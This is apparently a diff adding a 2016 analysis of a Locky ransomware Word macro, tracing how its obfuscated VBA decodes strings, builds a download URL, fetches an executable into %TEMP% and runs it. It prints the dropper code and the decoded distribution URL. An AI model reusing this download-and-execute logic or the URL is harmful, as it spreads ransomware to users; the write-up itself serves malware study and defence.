@@ -1,0 +1,101 @@
+Obfuscation layers in MS Word .docm files used for distributing Locky
+
+May 2016 by zyxtarmo
+
+Disassembling ORDER-XXX-XXX-XXX.docm
+
+We'll be using olevba  from oletools (http://decalage.info/python/oletools) on vbaProject.bin after we unzip it from the .docm container. As a result we'll have bunch of decoded streams to sort out. We know, that Locky will be fetched from external web server, so let's find out how this is done.
+
+Most probably somewhere are CreateObject call(s), let's find them:
+
+ Set Freddy_problems = CreateObject(constans_problems(1))
+ Set problems_KABARE = CreateObject(constans_problems(2))
+ Set problems__0_22 = CreateObject(constans_problems(3))
+ Set problems__1 = CreateObject(constans_problems(0))
+
+This result strongly hints, that we need to look into constans_problems.
+
+Array of parameters for CreateObject etc
+
+Public constans_problems() As String
+
+This array is populated from slightly obfuscated string that is placed on button caption in the document.
+
+We'll decode data with help of python:
+
+t = "D!icrobrioft.XD!LHTTP10)Adodb.britr00aD!10)brih00ll.Application10)Wbricript.brih00ll10)Proc00bribri10)G00T10)T00D!P10)Typ0010)op00n10)writ0010)r00briponbri00Body10)briav00tofil0010)\hendib00.00x00"
+print t.replace( "00", "e").replace("D!", "M").replace("bri", "s").replace("10)", "\n")
+
+and the result is: 
+0. Microsoft.XMLHTTP
+1. Adodb.streaM
+2. shell.Application
+3. Wscript.shell
+4. Process
+5. GeT
+6. TeMP
+7. Type
+8. open
+9. write
+10. responseBody
+11. savetofile
+12. \hendibe.exe
+
+Looking at the list, we'll already see where this is heading ...
+
+problems__1.Open constans_problems(2 + 1 + 2), Constant_4, False
+problems__1.send
+
+So it is Microsoft.XMLHTTP GET request, we do not know yet the URL, so let's find it out:
+
+For ElCounter = LBound(MassiveA) To UBound(MassiveA)
+ Constant_4 = Constant_4 & RemoveSpecialChar(ElCounter)
+Next ElCounter
+
+so the URL is created letter-by-letter from encoded stream in MassiveA:
+
+MassiveA = Split("1664¨1856¨1856¨1792¨928¨752¨752¨1856¨1824¨1872¨1584¨1584¨1776¨1552¨1952¨1552¨1632¨1552¨1856¨1552¨1840¨736¨1584¨1776¨1744¨752¨912¨896¨880¨1856¨848¨1856¨880¨1648", "¨")
+
+char decoder:
+
+ RemoveSpecialChar = Chr(CInt(MassiveA(strFileName)) / (9 + 7))
+
+Result using python:
+
+for i in "1664¨1856¨1856¨1792¨928¨752¨752¨1856¨1824¨1872¨1584¨1584¨1776¨1552¨1952¨1552¨1632¨1552¨1856¨1552¨1840¨736¨1584¨1776¨1744¨752¨912¨896¨880¨1856¨848¨1856¨880¨1648".split("¨"):
+	printf("%s", chr( int(i) / 16 ) )
+
+>>> http://truccoazafatas.com/987t5t7g
+
+So what is the future on GETted object? 
+
+From here:
+
+Public Function KABARE_DUET_AKADEMIA(pressure As Double)
+ ROSTIX = CallByName(problems__1, constans_problems(1000 / 100), VbGet)
+ CallByName Freddy_problems, constans_problems(9), VbMethod, ROSTIX
+ KABARE_DUET_AKADEMIA = (1# * 10 ^ 5) * pressure
+End Function
+
+we can see that response body will be stored in ROSTIX, which is then written in the adodb stream.
+
+In order to follow what happens to this stream, we need to follow problems__0_22:
+
+Set problems__0_22 = CreateObject(constans_problems(3))
+/.../
+     Set problems__3 = problems__0_22.Environment(constans_problems(4)) // get environment
+     DevuelveProhibidas ; // calculate url
+     problems__4 = problems__3(constans_problems(180 / 30)) ; // get temp
+/.../
+problems__DUET = problems__4
+problems__DUET = problems__DUET + constans_problems(55 - 43) ; // create string path + filename
+/.../ 
+
+Stream is written to the temporary file %TEMP%\hendibe.exe here:
+
+CallByName Freddy_problems, constans_problems(11), VbMethod, problems__DUET, 2 
+
+What is left to do, is to execute stored file:
+
+problems_KABARE.Open (problems__DUET)
+
